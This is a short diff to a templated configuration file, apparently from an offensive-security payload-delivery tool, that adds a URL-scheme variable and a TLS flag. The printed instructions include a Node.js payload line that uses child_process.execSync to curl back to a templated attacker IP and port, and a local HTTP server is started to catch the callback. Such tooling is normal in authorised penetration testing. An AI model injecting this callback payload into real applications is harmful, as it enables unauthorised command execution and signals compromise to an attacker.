@@ -9,8 +9,8 @@ content: |
   mkdir -p packstation/outbound; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                       -----Application------                         '; \
-  printf '%s\n' 'Deliver payload: require("child_process").execSync("curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/callback");'; \
+  printf '%s\n' 'Deliver payload: require("child_process").execSync("curl {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/callback");'; \
   printf '%s\n' '                       -----Linux------                         '; \
   printf '%s\n' 'Observe the callback below:                                     '; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
